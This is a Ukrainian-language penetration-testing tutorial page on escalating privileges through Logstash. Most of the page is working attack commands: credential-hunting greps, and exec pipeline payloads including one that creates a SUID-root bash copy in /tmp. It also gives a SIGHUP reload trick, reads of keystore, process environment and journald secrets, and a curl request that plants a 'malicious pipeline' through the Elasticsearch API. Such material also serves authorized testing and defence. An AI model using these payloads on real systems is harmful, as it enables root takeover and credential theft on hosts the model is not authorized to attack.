# Ескалація привілеїв Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та надсилання логів** через систему, відому як **pipelines**. Ці pipelines складаються з етапів **input**, **filter** та **output**. Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Конфігурація Pipeline

Pipelines налаштовуються у файлі **/etc/logstash/pipelines.yml**, у якому зазначено розташування конфігурацій pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Цей файл показує, де розташовані файли **.conf**, що містять конфігурації pipeline. Під час використання **Elasticsearch output module** до **pipelines** часто включаються **Elasticsearch credentials**, які нерідко мають широкі привілеї, оскільки Logstash має записувати дані до Elasticsearch. Wildcards у шляхах конфігурації дають Logstash змогу виконувати всі pipeline, що відповідають шаблону, у вказаній директорії.

Якщо Logstash запущено з `-f <directory>` замість `pipelines.yml`, **усі файли всередині цієї директорії об'єднуються в лексикографічному порядку та аналізуються як єдиний config**. Це створює 2 offensive implications:

- Доданий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити спосіб складання фінального pipeline
- Некоректний файл може перешкодити завантаженню всього pipeline, тому ретельно перевіряйте payloads, перш ніж покладатися на auto-reload

### Fast Enumeration на Compromised Host

На host, де встановлено Logstash, швидко перевірте:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він прив’язується до **127.0.0.1:9600**, чого зазвичай достатньо після отримання доступу до хоста:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Зазвичай це надає вам ID pipeline, відомості про runtime і підтвердження того, що змінений pipeline завантажено.

Облікові дані, отримані з Logstash, часто відкривають доступ до **Elasticsearch**, тому перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Ескалація привілеїв через доступні для запису pipeline

Щоб спробувати виконати ескалацію привілеїв, спочатку визначте користувача, від імені якого працює сервіс Logstash, зазвичай це користувач **logstash**. Переконайтеся, що виконується **одна** з цих умов:

- Ви маєте **доступ на запис** до файлу pipeline **.conf** **або**
- Файл **/etc/logstash/pipelines.yml** використовує wildcard, а ви можете записувати до цільової папки

Крім того, має виконуватися **одна** з цих умов:

- Ви можете перезапустити сервіс Logstash **або**
- У файлі **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**

Якщо в конфігурації використовується wildcard, створення файлу, що відповідає цьому wildcard, дає змогу виконувати команди. Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** запускається кожні 120 секунд, а її вивід спрямовується до **/tmp/output.log**.

Якщо в **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**, Logstash автоматично виявлятиме та застосовуватиме нові або змінені конфігурації pipeline без потреби в перезапуску.<sup>[[1]](#references)</sup> Якщо wildcard відсутній, зміни все одно можна вносити до наявних конфігурацій, але слід бути обережними, щоб уникнути збоїв.

### Надійніші payloads для Pipeline

Плагін введення `exec` досі працює в поточних релізах і потребує або `interval`, або `schedule`. Він виконується шляхом **forking** JVM Logstash, тому за нестачі памʼяті ваш payload може завершитися з помилкою `ENOMEM`, а не запуститися непомітно.

Практичнішим payload для privilege escalation зазвичай є той, що залишає довговічний артефакт:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Якщо у вас немає прав на перезапуск, але ви можете надіслати процесу сигнал, Logstash також підтримує перезавантаження, ініційоване **SIGHUP**, у Unix-подібних системах:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Майте на увазі, що не кожен plugin підтримує reload. Наприклад, input **stdin** перешкоджає автоматичному reload, тому не припускайте, що `config.reload.automatic` завжди підхопить ваші зміни.<sup>[[1]](#references)</sup>

### Викрадення секретів із Logstash

Перш ніж зосереджуватися лише на виконанні коду, зберіть дані, до яких Logstash уже має доступ:

- Облікові дані у відкритому вигляді часто жорстко закодовані всередині output `elasticsearch {}`, `http_poller`, JDBC inputs або налаштувань, пов’язаних із cloud
- Захищені налаштування можуть зберігатися у **`/etc/logstash/logstash.keystore`** або в іншій директорії `path.settings`
- Пароль keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а інсталяції на основі пакетів зазвичай отримують його з **`/etc/sysconfig/logstash`**
- Підстановка змінних середовища за допомогою `${VAR}` виконується під час запуску Logstash, тому варто перевірити environment service

Корисні перевірки:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Це також варто перевірити, оскільки **CVE-2023-46672** показала, що за певних обставин Logstash міг записувати конфіденційну інформацію в логи. Тому на хості post-exploitation старі логи Logstash і записи `journald` можуть розкривати credentials, навіть якщо поточна конфігурація посилається на keystore, а не зберігає секрети безпосередньо в ній.<sup>[[3]](#references)</sup>

### Зловживання централізованим керуванням pipeline

У деяких середовищах хост взагалі **не покладається на локальні файли `.conf`**. Якщо налаштовано **`xpack.management.enabled: true`**, Logstash може отримувати централізовано керовані pipeline з Elasticsearch/Kibana, і після ввімкнення цього режиму локальні конфігурації pipeline більше не є джерелом істини.<sup>[[2]](#references)</sup>

Це означає наявність іншого шляху атаки:

1. Отримати Elastic credentials із локальних налаштувань Logstash, keystore або логів
2. Перевірити, чи має обліковий запис кластерний privilege **`manage_logstash_pipelines`**
3. Створити або замінити централізовано керований pipeline, щоб хост Logstash виконав ваш payload під час наступного інтервалу опитування

API Elasticsearch, який використовується для цієї функції:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash уже зареєстрований для віддаленого отримання pipeline.

## References

- [1] [Elastic Docs: Перезавантаження конфігураційного файлу](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Налаштування централізованого керування pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Оновлення безпеки Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
